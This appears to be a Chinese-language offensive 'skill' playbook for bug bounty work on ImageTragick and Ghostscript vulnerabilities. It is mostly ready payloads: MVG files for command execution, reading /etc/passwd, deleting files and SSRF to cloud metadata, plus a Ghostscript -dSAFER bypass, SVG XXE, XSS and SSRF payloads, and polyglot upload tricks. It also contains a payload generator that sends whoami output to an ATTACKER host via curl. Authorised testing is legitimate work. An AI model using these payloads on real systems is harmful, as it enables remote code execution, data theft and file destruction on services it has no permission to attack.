---
name: imagetragick
description: CWE: CWE-78 / CWE-918 | CVE: CVE-2016-3714 (ImageTragick), CVE-2018-16509 (Ghostscript), CVE-2023-43115 (Ghostscript RCE) 核心: ImageMagick /…
category: vuln
tags: [middleware]
---

# ImageTragick / Ghostscript RCE 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-78 / CWE-918 | **CVE**: CVE-2016-3714 (ImageTragick), CVE-2018-16509 (Ghostscript), CVE-2023-43115 (Ghostscript RCE)
> **核心**: ImageMagick / Ghostscript / GraphicsMagick 在处理图片 (MVG / SVG / MSL / EPS / PDF) 时执行嵌入的命令 / 文件读写 / SSRF
> **赏金**: 高, 头像 / PDF 生成 / 缩略图 类场景赏金 $1000-$15000

---

## 0. First-pass Payload (MVG — ImageTragick)

### 命令执行 (CVE-2016-3714)

```xml
<!-- poc.mvg -->
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

上传或提交 `poc.mvg` (某些服务允许 MVG 作为图片处理), 命令行 `ls -la` 会执行。

### SSRF

```xml
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://example.com/proxy?url=http://169.254.169.254/latest/meta-data/'
pop graphic-context
```

### 任意文件读

```xml
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

### 任意文件删除

```xml
push graphic-context
image over 0,0 0,0 'ephemeral:/path/to/delete.txt'
pop graphic-context
```

---

## 1. 识别触发点

**所有处理图片的后端都是候选**:

| 功能 | 图片路径 |
|------|---------|
| 头像上传 | 用户 profile 更新 → 缩略图生成 |
| 商品图 / 封面 | 商家上传 → 多尺寸生成 |
| 签名 / 印章 | PDF 嵌入 |
| PDF 导出 (如订单 / 报表) | HTML 含图片 → PDF |
| OCR / 识别 | 图片先转 PDF |
| 邮件附件预览 | 后端用 ImageMagick 生成缩略 |
| 办公文档预览 | PPT / Word → PDF → PNG |

**识别后端是否用 ImageMagick / Ghostscript**:
- 上传特殊格式 (MVG / MSL / SVG / PDF / EPS) 看响应
- 观察生成缩略图的文件名 / Content-Disposition
- 错误消息含 `convert:` / `ImageMagick` / `Ghostscript` / `gs`

---

## 2. 文件格式速查

| 格式 | 扩展名 | 用于 |
|------|--------|------|
| MVG | `.mvg` | Magick Vector Graphics, 原生 payload (ImageTragick 经典) |
| MSL | `.msl` | Magick Scripting Language, 直接调用 ImageMagick 功能 |
| SVG | `.svg` | 可嵌入 `<foreignObject>` / 外部 DTD / XXE / XSS |
| EPS | `.eps` | PostScript, Ghostscript 处理, 可 RCE |
| PS | `.ps` | PostScript 原生 |
| PDF | `.pdf` | PostScript 嵌入 + JavaScript + Forms |
| PNG + 构造 chunk | `.png` | 虽然少, 但特定解析器漏洞 |
| JPG + EXIF | `.jpg` | EXIF 注入 metadata |
| GIF | `.gif` | 含 animation frame 逻辑, polyglot |

---

## 3. Ghostscript 利用

### 3.1 CVE-2018-16509 (-dSAFER 绕过)

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

上传 `.eps` / `.ps` 或嵌入 PDF, Ghostscript < 9.24 执行 `id`。

### 3.2 CVE-2023-43115 (新)

```postscript
%!PS
... (见公开 PoC)
```

影响 Ghostscript < 10.02.0, CVSS 9.8。

### 3.3 经典 "pipe" 字符

```
(%pipe%id)       → 执行 id
(%pipe%curl ATTACKER/)
```

`-dSAFER` 本应禁止, 但历史上多次绕过。

---

## 4. SVG 特有攻击面

### 4.1 XXE (外部 DTD)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### 4.2 XSS via SVG (若直接嵌入页面)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

### 4.3 SSRF via SVG xlink

```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### 4.4 SVG → PDF 链 (Headless)

若后端用 wkhtmltopdf / Puppeteer 把 SVG 嵌入 HTML 再转 PDF, 继承 Headless Browser SSRF (见 [ssrf-scenarios.md](ssrf-scenarios.md) §2)。

---

## 5. polyglot 文件 (绕过类型校验)

```bash
# 生成 JPG + MVG polyglot
# 服务端看扩展 .jpg 接收, ImageMagick 识别为 MVG 处理

# 简单做法: cat image.jpg poc.mvg > polyglot.jpg
# 更复杂: 构造 JPG marker 后嵌入 MVG
```

或者**双扩展**:
- `shell.mvg.jpg` / `shell.jpg.mvg`
- 服务端按最后扩展校验, ImageMagick 按 magic byte 识别

---

## 6. 工具

### 6.1 检测脚本 (ImageTragick)

```bash
# ImageTragick 官方 PoC
curl https://raw.githubusercontent.com/ImageTragick/PoCs/master/test.mvg -o test.mvg
# 修改命令后上传
```

### 6.2 nuclei 模板

```bash
${NUCLEI_PATH}/nuclei.exe -t http/vulnerabilities/imagemagick/ -l urls.txt
${NUCLEI_PATH}/nuclei.exe -t http/vulnerabilities/ghostscript/ -l urls.txt
```

### 6.3 自建 payload 生成器

```python
# 生成 OOB 外带版本
template = """push graphic-context
viewbox 0 0 640 480
fill 'url(https://ATTACKER/a"|curl ATTACKER/$(whoami))'
pop graphic-context"""
```

---

## 7. Testing Checklist

- [ ] 测试 MVG 直接上传 (若允许扩展)
- [ ] 测试 MSL 直接上传
- [ ] 测试 SVG + XXE
- [ ] 测试 SVG + XSS (若页面直接 inline SVG)
- [ ] 测试 EPS / PS / PDF Ghostscript 路径
- [ ] 测试 polyglot 文件 (`.jpg` 尾部嵌入 MVG)
- [ ] 测试不同触发点 (上传 / 预览 / 缩略图 / PDF 导出)
- [ ] 每种 payload 都配合 OOB DNS / HTTP 回调验证
- [ ] 检查后端是否 `policy.xml` 禁用了危险 coder (MVG/MSL)

---

## 8. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 上传成功但无 OOB 回调 | 可能 `policy.xml` 禁 MVG/MSL, 或新版 ImageMagick 7 默认禁用 |
| 响应 500 | 可能解析异常, 但未执行 payload; 不等于漏洞 |
| Ghostscript 返回 "unrecognized" | `-dSAFER` 可能生效, 换 CVE-2023-43115 新 bypass |
| SVG XXE 无外带 | libxml 默认禁外部实体, 换 SVG xlink SSRF 方向 |
| `.svg` 上传后返回 PNG | 服务端光栅化, SVG 内 script 不执行; 但 XXE / SSRF 可能仍成 |

---

## 9. 影响证明

- **低**: 上传格式被接收, 看到报错 / 非预期响应
- **中**: OOB DNS 回调, 证明解析器执行了外部资源加载
- **高**: `whoami` / `id` 外带回, RCE 证实
- **严重**: 读取 `/etc/passwd` / `app.config` / 内网元数据 AK

---

## 10. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- 文件上传 → [upload.md](upload.md)
- XXE → [xxe.md](xxe.md)
- SSRF (Headless Browser 组合) → [ssrf-scenarios.md](ssrf-scenarios.md) §2
- OOB 基础设施 → [../oob-infrastructure.md](../oob-infrastructure.md)

---

**CWE**: CWE-78 / CWE-918 | **CVE**: CVE-2016-3714 (MVG RCE) / CVE-2018-16509 (GS RCE) / CVE-2023-43115 (GS RCE) | **CVSS 典型**: 9.8 (未授权上传 + RCE)
